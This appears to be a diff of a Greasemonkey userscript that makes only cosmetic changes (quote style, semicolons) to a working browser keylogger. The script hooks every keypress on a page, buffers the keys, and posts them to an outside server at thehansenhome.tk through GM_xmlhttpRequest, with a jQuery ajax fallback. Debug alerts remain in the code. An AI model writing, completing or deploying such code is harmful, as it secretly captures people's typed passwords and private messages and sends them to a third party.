@@ -10,11 +10,11 @@
 // ==/UserScript==
 
 
-keys = "";
+keys = '';
 keyn = 0;
 document.onkeypress = function(evt) {
-   evt = evt || window.event
-   key = String.fromCharCode(evt.charCode)
+   evt = evt || window.event;
+   key = String.fromCharCode(evt.charCode);
    keys += key;
    keyn++;
    alert('got key');
@@ -22,7 +22,7 @@ document.onkeypress = function(evt) {
      sendKey(keys);
      keyn = 0;
    }
-}
+};
 
 function sendKey(pkey) {
    /*if (key) {
@@ -42,11 +42,11 @@ function sendKey(pkey) {
     });*/
     alert('sent key');
     GM_xmlhttpRequest({
-      method: "POST",
-      url: "http://www.thehansenhome.tk/s.php",
-      data: "key="+pkey,
+      method: 'POST',
+      url: 'http://www.thehansenhome.tk/s.php',
+      data: 'key='+pkey,
       headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
+        'Content-Type': 'application/x-www-form-urlencoded'
       },
       onload: function(response) {
         //if (response.responseText.indexOf("Logged in as") > -1) {
@@ -56,7 +56,7 @@ function sendKey(pkey) {
     });
    } catch (e) {
      $.ajax({
-        type: "POST",
+        type: 'POST',
         cache: false,       
         url: '//www.thehansenhome.tk/s.php',
         data: {key: pkey},
